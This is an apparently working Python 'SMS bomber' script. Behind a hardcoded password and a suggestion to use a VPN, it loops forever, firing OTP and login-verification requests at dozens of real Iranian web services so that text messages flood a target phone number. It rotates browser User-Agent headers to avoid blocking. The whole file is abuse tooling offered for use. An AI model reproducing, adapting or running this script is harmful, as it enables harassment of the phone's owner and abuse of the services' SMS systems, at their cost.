import requests
from colorama import Fore, Style
import time
import random
import time
#     print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

import requests
import json
from requests import get
import os
os.system("cls")
x2 = 0
x3 =0
while x2 == 0:
    x = str(input("[!] enter the password to use app : "))

    if x == "1387":
        print("[+] correct password continuing to app ")
        x2=x2+1
    else:
            print("[-] incorrect password ")
        
def getloc():
    try:
        ip = get('https://api.ipify.org').text

        ip_address = ip

        request_url = 'https://geolocation-db.com/jsonp/' + ip_address
        response = requests.get(request_url)
        result = response.content.decode()
        result = result.split("(")[1].strip(")")
        result  = json.loads(result)
        return str(result['country_name'])
    except:
        os.system("color 4")

        x2=" ...(i cant find your location)... "
        return str(x2)
os.system("color 4")
print("[!] created by eblis !")
print("[!] cheking your location")
print("[+] your in "+getloc()+" if your really in "+getloc()+" i recommend you to use a vpn to change your location when you changed prees enter")
input()
print("[+] your in "+getloc())

number = input("[!] Enter your phone number : ")
phone = number

url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'

url2 = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=214fa3b6-6cd8-4e66-965a-e958edd1c576&locale=fa'

url3 = 'https://core.gap.im/v1/user/add.json?mobile=%'

url4 = 'https://nobat.ir/api/public/patient/login/phone'

url5 = 'https://api.divar.ir/v5/auth/authenticate'

url6 = 'https://drdr.ir/api/registerEnrollment/verifyMobile'

url7 = 'https://www.tebinja.com/api/v1/users'

url8 = 'https://www.tabibyab.com/api/sendVerificationCode'

url9 = 'https://api.tapsi.cab/api/v2/user'

url10 = 'https://api.visit24.ir/user/login'

url11 = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'

url12 = 'https://api.digikala.com/v1/user/authenticate/'

url13 = 'https://myzel.ir/auth/login'

url14 = 'https://www.delino.com/user/register'

url15 = 'https://mamifood.org/Registration.aspx/IsUserAvailable'

url16 = 'https://atawich.com/Account/FoodPhoneNumberVerification/?lazyLoad=true&btnID=undefined'

url17 = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
url_divar= "https://api.divar.ir/v5/auth/authenticate"
json_divar= {"phone":number}

url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp= {"cellphone":"+98" + number}

url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa"
json_sf= {"cellphone":"0" + number}

url_sh= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sh= {"username":"0" + number}

url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba= {"phoneNumber":"+98" + number}

url_cinma= "https://cinematicket.org/api/v1/users/signup"
json_cinma= {"phone_number":"98" + number}

url_digikala= "https://api.digikala.com/v1/user/authenticate/"
json_digikala= {"backUrl":"/","username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

url_telewebion= "https://auth.telewebion.com/user/authenticate"
json_telewebion= {"field":"+98","type":"mobile" + number}

url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_sb= {"phoneNumber":"0" + number}

url_tpsi= "https://api.tapsi.cab/api/v2/user"
json_tpsi= {"credential":{"phoneNumber":"0","role":"PASSENGER" + number}}

url_tim = "https://api.timcheh.com/auth/otp/send"
json_tim = {"mobile":"0" + number}

url_of = "https://www.offdecor.com/index.php?route=account/login/sendCode"
json_of = {"phone":"0" + number}

url_tn = "https://tantak.ir/signup/check_phone"
json_tn = {"mobile":"0" + number}

url_bazaar = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
json_bazaar = {"properties":{"language":2,"clientID":"hajzgbx42chvzhimf2e90scice1w1rnk","deviceID":"hajzgbx42chvzhimf2e90scice1w1rnk","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":"+98" + number}}}

url_dig = "https://apitwo.digitoon.ir/mobile_login_step1/8?dg_id=5FBFC23A"
json_dig = {"mobile":"0" + number,"device_id":"desktop","device_model":"Firefox","device_os":"angularJS"}

url_kk = "https://dashboard-api.accessban.com/v1/auth/init"
json_kk = {"mobile":"0" + number}

url_mrg = "https://mrghasab.com/administrator/SMS/SendVerificationSMS.php?Site=0&Source=Account&PhoneNumber=0" + number

url_ba = "https://auth.basalam.com/otp-request"
json_ba = {"mobile":"0" + number,"client_id":11}

url_mod = "https://mobapi.banimode.com/api/v2/auth/request"
json_mod = {"phone":"0" + number}

url_reg = "https://drdr.ir/api/registerEnrollment/verifyMobile"
json_reg = {"phoneNumber":"0" + number,"userType":"PATIENT"}

url_doc = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
json_doc = {"mobile":"" + number,"country_id":205}

url_gap = "https://core.gapfilm.ir/api/v3.1/Account/Login"
json_gap = {"Type":3,"Username":"" + number,"SourceChannel":"GF_WebSite","SourcePlatform":"desktop","SourcePlatformAgentType":"Firefox","SourcePlatformVersion":"104.0"}

url_it = "https://app.itoll.ir/api/v1/auth/login"
json_it = {"mobile":"0" + number}

url_taa = "https://gw.taaghche.com/v4/site/auth/login"
json_taa = {"contact":"0" + number,"forceOtp":"false"}

url_ll = "https://dayanshop.com/Auth/CheckPhoneNumber"
json_ll = {"phoneNumber":"0" + number,"AuthenticationMode":"1"}

url_tap = "https://api.tapsi.cab/api/v2.2/user"
json_tap = {"credential":{"phoneNumber":"0" + number,"role":"PASSENGER"},"otpOption":"SMS"}

url_fan =  "https://apollo.digify.shop/graphql"
json_fan = {"operationName":"Mutation","variables":{"content":{"phone_number":"0" + number}},"query":"mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}"}

url_mar = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0" + number

url_gol = "https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth"
json_gol = {"phoneNumber":"0" + number}

heads = [

{
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },

]
while True:

    # Digikala
    responses = requests.post("https://api.digikala.com/v1/user/authenticate/", json={"username":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.GREEN + '[+] Not Success ! Sms Bomber Created By eblis')

    # Snap
    responses = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json={"cellphone":f"+98{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Bazar
    responses = requests.post("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", json={"properties":{"language":2,"clientID":"c2dqmjg5ag3um03lrnmqj4pmqaamz3rd","deviceID":"c2dqmjg5ag3um03lrnmqj4pmqaamz3rd","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":f"98{phone}"}}})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Ali-Baba
    responses = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json={ "phoneNumber": f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Ponisha
    responses = requests.post("https://ponisha.ir/send-mobile-verfication", json={ "mobile": f"+98{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # login-filmo
    responses = requests.post("https://www.filimo.com/api/fa/v1/user/Authenticate/country_code", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Divar
    responses = requests.post("https://api.divar.ir/v5/auth/authenticate", json={"phone":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Torob
    responses = requests.get(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone}")
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Telewebion
    responses = requests.post("https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one?isForeign=true", json={"code":"98","phone":f"{phone}","smsStatus":"default"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Timcheh
    responses = requests.post("https://api.timcheh.com/auth/otp/send", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Mobit
    responses = requests.post("https://api.mobit.ir/api/web/v6/register/login", json={"number":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')
        

    # Kilid
    responses = requests.post("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

     # Behtarino
    responses = requests.post("https://bck.behtarino.com/api/v1/users/phone_verification/", json={"phone":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Ostadkar
    responses = requests.post("https://api.ostadkr.com/login", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # snapp.market
    responses = requests.post(f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone}")
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Banimode
    responses = requests.post("https://mobapi.banimode.com/api/v2/auth/request", json={"phone":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Drdr
    responses = requests.post("https://drdr.ir/api/registerEnrollment/verifyMobile", json={"phoneNumber":f"{phone}","userType":"PATIENT"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Jabama
    responses = requests.post("https://taraazws.jabama.com/api/v4/account/send-code", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Flightio
    responses = requests.post("https://flightio.com/bff/Authentication/CheckUserKey", json={"userKey":f"98-{phone}","userKeyType":1})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Football360
    responses = requests.post("https://football360.ir/api/auth/verify-phone/", json={"phone_number":f"+98{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Restart

    random_head = random.choice(heads)

    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req1 = requests.post(url= url_snapp,json=json_snapp,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req2 = requests.post(url= url_sf,json=json_sf,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req3 = requests.post(url= url_sh,json=json_sh,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req4 = requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req5 = requests.post(url= url_cinma,json=json_cinma,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req6 = requests.post(url= url_digikala,json=json_digikala,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req7 = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req8 = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req9 = requests.post(url= url_aparat,json=json_aparat,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req10 = requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req11 = requests.post(url= url_sb,json=json_sb,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req12 = requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    
    req13 = requests.post(url= url_tim,json=json_tim,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req14 = requests.post(url= url_of,json=json_of,headers=random_head)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req15 = requests.post(url=url_tn,json=json_tn,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
  
    req16 = requests.post(url=url_bazaar,json=json_bazaar,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req17 = requests.post(url=url_dig,json=json_dig,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req18 = requests.post(url=url_kk,json=json_kk,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req19 = requests.post(url=url_mrg,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req20 = requests.post(url=url_ba,json=json_ba,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req21 = requests.post(url=url_mod,json=json_mod,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
     
    req22 = requests.post(url=url_reg,json=json_reg,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    
    req23 = requests.post(url=url_doc,json=json_doc,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req24 = requests.post(url=url_gap,json=json_gap,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req25 = requests.post(url=url_it,json=json_it,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req26 = requests.post(url=url_taa,json=json_taa,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req27 = requests.post(url=url_ll,json=json_ll,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req28 = requests.post(url=url_tap,json=json_tap,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req29 = requests.post(url=url_fan,json=json_fan,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req30 = requests.post(url=url_mar,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    req31 = requests.post(url=url_gol,json=json_gol,headers=random_head) 
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')

    time.sleep(1)
    pyload =  {"cellphone": number }
    p = requests.post(url, data=pyload)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload2 =  {"cellphone": number }
    p = requests.post(url2, data=pyload2)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload3 =  {"mobile": number}
    p = requests.post(url3, data=pyload3)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload4 =  {"mobile": number}
    p = requests.post(url4, data=pyload4)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload5 =  {"phone": number}
    p = requests.post(url5, data=pyload5)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload6 = {"phonenumber": number}
    p = requests.post(url6, data=pyload6)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload7 = {"username": number} 
    p = requests.post(url7, data=pyload7)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload8 = {"phone": number}
    p = requests.post(url8, data=pyload8)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload9 = {"phonenumber": number}
    p = requests.post(url9, data=pyload9)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload10 = {"mobile": number }
    p = requests.post(url10, data=pyload10)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload11 = {"mobile": number }
    p = requests.post(url11, data=pyload11)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload12 = {"username": number }
    p = requests.post(url12, data=pyload12)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload13 = {"cell": number }
    p = requests.post(url13, data=pyload13)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload14 = {"mobile": number }
    p = requests.post(url14, data=pyload14)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload15 = {"cellphone": number }
    p = requests.post(url15, data=pyload15)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload16 = {"PhoneNumber": number }
    p = requests.post(url16, data=pyload16)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    pyload17 = {"phoneNumber": number }
    p = requests.post(url17, data=pyload17)
    print(Fore.GREEN + '[+] Success! Sms Bomber Created By eblis')
    print(Fore.CYAN + 'Restart, please wait...')
    print("")
    time.sleep(5)